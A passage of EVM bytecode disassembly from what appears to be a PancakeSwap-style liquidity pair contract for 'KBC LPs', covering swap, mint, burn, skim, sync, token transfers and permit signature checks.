JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xB21 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH2 0xB53 PUSH4 0x5F5E100 PUSH2 0xB47 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP12 DUP2 AND SWAP1 DUP12 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xB63 DUP4 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST LT ISZERO PUSH2 0xBA3 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x50616E63616B653A204B PUSH1 0xB0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP PUSH2 0xBB1 DUP5 DUP5 DUP9 DUP9 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE DUP1 DUP3 ADD DUP14 SWAP1 MSTORE PUSH1 0x60 DUP2 ADD DUP13 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP12 AND SWAP2 CALLER SWAP2 PUSH32 0xD78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822 SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG3 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP3 PUSH1 0x1 PUSH1 0x70 SHL DUP4 DIV SWAP1 SWAP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV PUSH4 0xFFFFFFFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x2079 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xCDE JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x2830B731B0B5B29D102327A92124A22222A7 PUSH1 0x71 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x8 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x9 DUP1 SLOAD SWAP4 SWAP1 SWAP5 AND SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0xD9E JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0xD79 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0xDA9 DUP5 DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xC SLOAD DUP2 JUMP JUMPDEST PUSH1 0xD SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0xE4B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0xE5B PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEC3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xED9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF40 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF56 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0xF75 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xF92 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFA0 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0xFDD JUMPI PUSH2 0xFC9 PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22F6 JUMP JUMPDEST SWAP9 POP PUSH2 0xFD8 PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x102C JUMP JUMPDEST PUSH2 0x1029 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1001 JUMPI INVALID JUMPDEST DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x101C DUP7 DUP6 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1023 JUMPI INVALID JUMPDEST DIV PUSH2 0x23CC JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x106B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2690 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1075 DUP11 DUP11 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x10B1 JUMPI PUSH1 0xB SLOAD PUSH2 0x10AD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP6 SWAP1 MSTORE DUP2 MLOAD CALLER SWAP3 PUSH32 0x4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F SWAP3 DUP3 SWAP1 SUB ADD SWAP1 LOG2 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP SWAP5 SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xE SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1174 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x1184 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP5 SWAP7 POP SWAP3 SWAP5 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 SWAP2 AND SWAP2 PUSH1 0x0 SWAP2 DUP5 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x11F4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x120A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP3 POP PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1258 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x126C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1282 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP2 SWAP3 POP PUSH2 0x12A1 DUP9 DUP9 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x12B8 DUP5 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12BF JUMPI INVALID JUMPDEST DIV SWAP11 POP DUP1 PUSH2 0x12D3 DUP5 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12DA JUMPI INVALID JUMPDEST DIV SWAP10 POP PUSH1 0x0 DUP12 GT DUP1 ISZERO PUSH2 0x12ED JUMPI POP PUSH1 0x0 DUP11 GT JUMPDEST PUSH2 0x1328 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2627 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1332 ADDRESS DUP5 PUSH2 0x23E4 JUMP JUMPDEST PUSH2 0x133D DUP8 DUP14 DUP14 PUSH2 0x1C69 JUMP JUMPDEST PUSH2 0x1348 DUP7 DUP14 DUP13 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP10 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x138E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x13A2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x13B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP7 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1404 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1418 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x142E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP4 POP PUSH2 0x143E DUP6 DUP6 DUP12 DUP12 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x146E JUMPI PUSH1 0xB SLOAD PUSH2 0x146A SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP13 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP13 SWAP1 MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP16 AND SWAP3 CALLER SWAP3 PUSH32 0xDCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496 SWAP3 SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP POP POP POP POP POP POP PUSH1 0x1 PUSH1 0xF DUP2 SWAP1 SSTORE POP SWAP2 POP SWAP2 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST PUSH2 0x3E8 DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1559 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND SWAP5 SWAP1 SWAP4 AND SWAP3 PUSH2 0x1608 SWAP3 DUP6 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 DUP6 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x15DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x166F SWAP3 DUP5 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x16DF JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x17FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1830 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1881 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x188C DUP10 DUP10 DUP10 PUSH2 0x2079 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 